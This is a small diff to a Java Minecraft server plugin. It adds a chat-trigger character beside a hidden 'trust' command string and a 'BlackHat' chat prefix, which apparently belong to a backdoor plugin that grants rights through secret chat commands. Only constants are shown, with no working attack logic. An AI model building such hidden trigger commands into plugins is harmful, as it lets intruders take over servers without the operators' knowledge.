@@ -27,6 +27,7 @@ public final class Start extends JavaPlugin {
 
     public static Start Instance = null;
     public static String COMMAND_SIGN = "-";
+    public static Character CHAT_TRIGGER = '#';
     public static String TRUST_COMMAND = "-dicksuck";
     public static String Prefix = "§a[§3Black§4Hat§a]§r ";
     public static @NotNull Logger LOGGER;
